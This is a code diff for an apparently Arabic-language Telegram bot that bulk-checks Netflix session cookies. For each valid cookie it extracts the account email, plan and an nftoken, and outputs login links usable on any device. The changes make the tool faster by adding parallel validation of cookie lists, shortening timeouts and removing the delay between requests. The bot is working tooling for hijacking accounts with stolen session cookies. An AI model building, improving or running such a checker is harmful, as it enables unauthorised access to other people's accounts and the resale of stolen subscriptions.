@@ -40,7 +40,7 @@ def input_method():
     )
     return keyboard
 
-def result_actions(nftoken, netflix_id):
+def result_actions(nftoken):
     keyboard = InlineKeyboardMarkup(row_width=1)
     keyboard.add(
         InlineKeyboardButton("📱 نسخ رابط الهاتف", callback_data=f"copy_phone:{nftoken}"),
@@ -52,7 +52,7 @@ def result_actions(nftoken, netflix_id):
     return keyboard
 
 async def extract_nftoken(cookie_str: str) -> str:
-    """استخراج nftoken من الكوكيز"""
+    """استخراج nftoken من الكوكيز بسرعة"""
     cookies_dict = {}
     for cookie in cookie_str.split(';'):
         cookie = cookie.strip()
@@ -60,31 +60,23 @@ async def extract_nftoken(cookie_str: str) -> str:
             name, value = cookie.split('=', 1)
             cookies_dict[name.strip()] = value.strip()
 
-    # محاولة البحث عن nftoken مباشرة في الكوكيز
     if 'nftoken' in cookies_dict:
         return cookies_dict['nftoken']
 
-    # محاولة استخراجه من NetflixId و SecureNetflixId
     netflix_id = cookies_dict.get('NetflixId', '')
     secure_netflix_id = cookies_dict.get('SecureNetflixId', '')
 
     if netflix_id and secure_netflix_id:
-        # تنسيق nftoken من المعرفات (هذه الطريقة تعتمد على طريقة عمل نتفليكس)
         return f"{netflix_id}|{secure_netflix_id}"
 
-    # محاولة من Flwssn cookie
     flwssn = cookies_dict.get('flwssn', '')
     if flwssn:
         return flwssn
 
-    # محاولة من clSharedContext
-    cl_shared = cookies_dict.get('clSharedContext', '')
-    if cl_shared:
-        return cl_shared
-
     return ''
 
 async def check_netflix_cookie(cookie_str: str) -> dict:
+    """فحص سريع للكوكيز"""
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
@@ -103,9 +95,11 @@ async def check_netflix_cookie(cookie_str: str) -> dict:
         'error': None
     }
 
-    async with aiohttp.ClientSession() as session:
+    timeout = aiohttp.ClientTimeout(total=8)
+
+    async with aiohttp.ClientSession(timeout=timeout) as session:
         try:
-            async with session.get('https://www.netflix.com/YourAccount', headers=headers, timeout=15) as resp:
+            async with session.get('https://www.netflix.com/YourAccount', headers=headers) as resp:
                 if resp.status == 200:
                     text = await resp.text()
 
@@ -124,15 +118,14 @@ async def check_netflix_cookie(cookie_str: str) -> dict:
                     result['valid'] = True
                 else:
                     result['error'] = f"HTTP {resp.status}"
+        except asyncio.TimeoutError:
+            result['error'] = "انتهت مهلة الفحص"
         except Exception as e:
             result['error'] = str(e)
 
         if result['valid']:
-            # استخراج nftoken
-            nftoken = await extract_nftoken(cookie_str)
-            result['nftoken'] = nftoken
+            result['nftoken'] = await extract_nftoken(cookie_str)
 
-            # استخراج NetflixId
             cookies_dict = {}
             for cookie in cookie_str.split(';'):
                 cookie = cookie.strip()
@@ -141,23 +134,12 @@ async def check_netflix_cookie(cookie_str: str) -> dict:
                     cookies_dict[name.strip()] = value.strip()
             result['netflix_id'] = cookies_dict.get('NetflixId', '')
 
-            # محاولة استخراج nftoken من صفحة الحساب
-            try:
-                async with session.get('https://www.netflix.com/YourAccount', headers=headers, timeout=15) as resp2:
-                    text2 = await resp2.text()
-                    # البحث عن nftoken في الصفحة
-                    nftoken_match = re.search(r'nftoken["\']?\s*:\s*["\']([^"\']+)["\']', text2)
-                    if nftoken_match:
-                        result['nftoken'] = nftoken_match.group(1)
-                    else:
-                        # البحث في أي رابط يحتوي على nftoken
-                        url_match = re.search(r'nftoken=([^&\'"\s]+)', text2)
-                        if url_match:
-                            result['nftoken'] = url_match.group(1)
-            except:
-                pass
-
     return result
+
+async def check_multiple_cookies(cookies_list: list) -> list:
+    """فحص عدة كوكيز بالتوازي"""
+    tasks = [check_netflix_cookie(cookie) for cookie in cookies_list]
+    return await asyncio.gather(*tasks)
 
 @dp.message_handler(commands=['start'])
 async def cmd_start(message: types.Message):
@@ -175,6 +157,7 @@ async def cmd_start(message: types.Message):
 
 @dp.callback_query_handler(lambda c: c.data == 'bot_info')
 async def process_bot_info(callback_query: types.CallbackQuery):
+    await callback_query.answer()
     info_text = """
 ℹ️ **معلومات البوت**
 
@@ -182,53 +165,49 @@ async def process_bot_info(callback_query: types.CallbackQuery):
 - معلومات الحساب
 - nftoken
 - روابط تسجيل دخول لجميع الأجهزة
-
-**طريقة الاستخدام:**
-1. اضغط "بدء فحص ملف جديد"
-2. أرسل الكوكيز أو ملف
-3. استلم النتائج مع أزرار النسخ
     """
     await callback_query.message.edit_text(info_text, parse_mode=ParseMode.MARKDOWN, reply_markup=main_menu())
-    await callback_query.answer()
 
 @dp.callback_query_handler(lambda c: c.data == 'start_check')
 async def process_start_check(callback_query: types.CallbackQuery):
+    await callback_query.answer()
     await callback_query.message.edit_text(
         "🚀 **بدء فحص ملف جديد**\n\nاختر طريقة إرسال الكوكيز:",
         parse_mode=ParseMode.MARKDOWN,
         reply_markup=input_method()
     )
-    await callback_query.answer()
 
 @dp.callback_query_handler(lambda c: c.data == 'send_file')
 async def process_send_file(callback_query: types.CallbackQuery):
+    await callback_query.answer()
     await callback_query.message.edit_text(
         "📄 **أرسل الملف الآن**\n\nأرسل ملف يحتوي على كوكيز (كل سطر كوكيز منفصل)",
         parse_mode=ParseMode.MARKDOWN
     )
     await Form.waiting_cookie_file.set()
-    await callback_query.answer()
 
 @dp.callback_query_handler(lambda c: c.data == 'send_text')
 async def process_send_text(callback_query: types.CallbackQuery):
+    await callback_query.answer()
     await callback_query.message.edit_text(
         "📝 **أرسل الكوكيز الآن**\n\nالصق الكوكيز مباشرة في الرسالة",
         parse_mode=ParseMode.MARKDOWN
     )
     await Form.waiting_cookies.set()
-    await callback_query.answer()
 
 @dp.message_handler(state=Form.waiting_cookies, content_types=types.ContentTypes.TEXT)
 async def process_text_cookies(message: types.Message, state: FSMContext):
     cookie_str = message.text.strip()
-    processing_msg = await message.reply("⏳ **جاري فحص الكوكيز...**", parse_mode=ParseMode.MARKDOWN)
+
+    # رد فوري
+    processing_msg = await message.reply("⏳ **جاري الفحص...**", parse_mode=ParseMode.MARKDOWN)
 
     result = await check_netflix_cookie(cookie_str)
+
     await processing_msg.delete()
 
     if result['valid']:
         nftoken = result.get('nftoken', '')
-        netflix_id = result.get('netflix_id', '')
 
         result_text = f"""
 ✅ **فحص ناجح!**
@@ -246,21 +225,21 @@ async def process_text_cookies(message: types.Message, state: FSMContext):
         await message.reply(
             result_text,
             parse_mode=ParseMode.MARKDOWN,
-            reply_markup=result_actions(nftoken, netflix_id)
+            reply_markup=result_actions(nftoken)
         )
     else:
-        error_text = f"""
-❌ **فشل الفحص**
-
-**السبب:** `{result['error'] or 'كوكيز غير صالح'}`
-        """
-        await message.reply(error_text, parse_mode=ParseMode.MARKDOWN, reply_markup=main_menu())
+        await message.reply(
+            f"❌ **فشل الفحص**\n\n**السبب:** `{result['error'] or 'كوكيز غير صالح'}`",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=main_menu()
+        )
 
     await state.finish()
 
 @dp.message_handler(state=Form.waiting_cookie_file, content_types=types.ContentTypes.DOCUMENT)
 async def process_cookie_file(message: types.Message, state: FSMContext):
-    processing_msg = await message.reply("⏳ **جاري فحص الملف...**", parse_mode=ParseMode.MARKDOWN)
+    # رد فوري
+    processing_msg = await message.reply("⏳ **جاري تحميل الملف...**", parse_mode=ParseMode.MARKDOWN)
 
     document = message.document
     file_info = await bot.get_file(document.file_id)
@@ -268,6 +247,7 @@ async def process_cookie_file(message: types.Message, state: FSMContext):
     content = downloaded_file.read().decode('utf-8', errors='ignore')
 
     cookies_list = [line.strip() for line in content.split('\n') if line.strip()]
+
     await processing_msg.delete()
 
     if not cookies_list:
@@ -275,25 +255,30 @@ async def process_cookie_file(message: types.Message, state: FSMContext):
         await state.finish()
         return
 
+    # فحص متوازي
+    status_msg = await message.reply(f"⏳ **جاري فحص {len(cookies_list)} كوكيز...**", parse_mode=ParseMode.MARKDOWN)
+
+    results = await check_multiple_cookies(cookies_list)
+
+    await status_msg.delete()
+
     results_text = "📊 **نتائج الفحص:**\n\n"
     valid_count = 0
 
-    for i, cookie in enumerate(cookies_list, 1):
-        result = await check_netflix_cookie(cookie)
+    for i, result in enumerate(results, 1):
         if result['valid']:
             valid_count += 1
             nftoken = result.get('nftoken', '')
             results_text += f"""
 ✅ **كوكيز {i}:**
-📧 الإيميل: `{result['email'] or 'N/A'}`
-💳 الخطة: `{result['plan'] or 'N/A'}`
-🔑 nftoken: `{nftoken[:50]}...`
+📧 `{result['email'] or 'N/A'}`
+💳 `{result['plan'] or 'N/A'}`
+🔑 `{nftoken[:50]}...`
 🔗 https://netflix.com/?nftoken={nftoken}
 ---
 """
         else:
             results_text += f"❌ **كوكيز {i}:** غير صالح\n---\n"
-        await asyncio.sleep(1)
 
     results_text += f"\n📈 **الإجمالي:** {valid_count}/{len(cookies_list)} صالح"
 
@@ -308,6 +293,8 @@ async def process_cookie_file(message: types.Message, state: FSMContext):
 
 @dp.callback_query_handler(lambda c: c.data and c.data.startswith('copy_'))
 async def process_copy_buttons(callback_query: types.CallbackQuery):
+    await callback_query.answer()
+
     data = callback_query.data
     parts = data.split(':', 1)
 
@@ -318,7 +305,6 @@ async def process_copy_buttons(callback_query: types.CallbackQuery):
     action = parts[0]
     nftoken = parts[1] if len(parts) > 1 else ''
 
-    # إنشاء الروابط بنفس صيغة المثال
     base_url = "https://netflix.com/?nftoken="
     link = base_url + nftoken
 
@@ -338,12 +324,10 @@ async def process_copy_buttons(callback_query: types.CallbackQuery):
         copy_text = nftoken
         label = "🔑 **nftoken**"
 
-    # إرسال الرابط في رسالة منفصلة مع كود بلوك للنسخ السهل
     await callback_query.message.reply(
         f"{label}:\n\n`{copy_text}`\n\n⚠️ **اضغط مطولاً على النص للنسخ**",
         parse_mode=ParseMode.MARKDOWN
     )
-    await callback_query.answer("تم العرض ✅", show_alert=True)
 
 @dp.message_handler(commands=['cancel'], state='*')
 async def cmd_cancel(message: types.Message, state: FSMContext):
